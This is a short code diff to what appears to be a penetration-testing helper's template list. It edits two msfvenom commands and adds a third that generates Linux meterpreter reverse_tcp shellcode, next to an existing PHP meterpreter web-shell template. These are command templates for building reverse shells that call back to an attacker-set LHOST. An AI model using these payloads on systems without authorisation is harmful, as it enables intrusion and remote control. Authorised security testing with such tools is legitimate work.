@@ -147,7 +147,7 @@ Load({
 
 Load({
 	title: "Generate Metasploit Binary",
-	payload:'msfvenom -p <PROMPT (payload type)> LHOST=<LHOST (local host)> LPORT=<LPORT (local port)> -f <PROMPT (payload format)> > file',
+	payload:'msfvenom -p <PROMPT (payload type)> LHOST=<LHOST> LPORT=<LPORT> -f <PROMPT (payload format)> > file',
 	category: "MSF Venom",
 	callback: function(bro){
 		question("What payload would you like to use? (ex: linux/x86/meterpreter/reverse_tcp)");
@@ -158,13 +158,24 @@ Load({
 
 Load({
 	title: "Generate Metasploit PHP Web Shell",
-	payload:"msfvenom -p php/meterpreter/<PROMPT (payload type)> LHOST=<LHOST (local host)> LPORT=<LPORT (local port)> -f raw > shell.php",
+	payload:"msfvenom -p php/meterpreter/<PROMPT (payload type)> LHOST=<LHOST> LPORT=<LPORT> -f raw > shell.php",
 	category: "MSF Venom",
 	callback: function(bro){
 		question("What payload would you like to use? (ex: reverse_tcp, reverse_http, etc)");
 		ask.some(questions, bro);
 	}
 })
+
+Load({
+	title: "Generate Metasploit Shellcode",
+	payload:"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f <PROMPT (language)>",
+	category: "MSF Venom",
+	callback: function(bro){
+		question("What language would you like to generate the shellcode in?");
+		ask.some(questions, bro);
+	}
+})
+
 //
 
 /*
